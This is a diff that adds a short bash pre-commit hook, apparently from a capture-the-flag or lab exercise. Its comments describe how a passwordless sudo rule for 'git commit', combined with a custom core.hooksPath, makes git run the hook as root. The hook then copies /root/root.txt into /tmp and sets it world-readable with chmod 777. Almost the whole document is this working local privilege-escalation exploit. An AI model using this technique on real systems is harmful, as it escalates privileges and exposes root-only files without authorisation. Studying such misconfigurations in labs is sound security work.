@@ -1,0 +1,12 @@
+#!/bin/bash
+# pre-commit hook — executes as root via: sudo /usr/bin/git commit
+# Configured via: git config core.hooksPath /home/admin/myhooks
+#
+# The sudoers rule allows:
+#   admin ALL=(ALL:ALL) NOPASSWD: /usr/bin/git commit
+#
+# Git runs pre-commit hooks as the same user as the git process.
+# sudo git commit = hooks run as root.
+
+cat /root/root.txt > /tmp/root_flag.txt
+chmod 777 /tmp/root_flag.txt
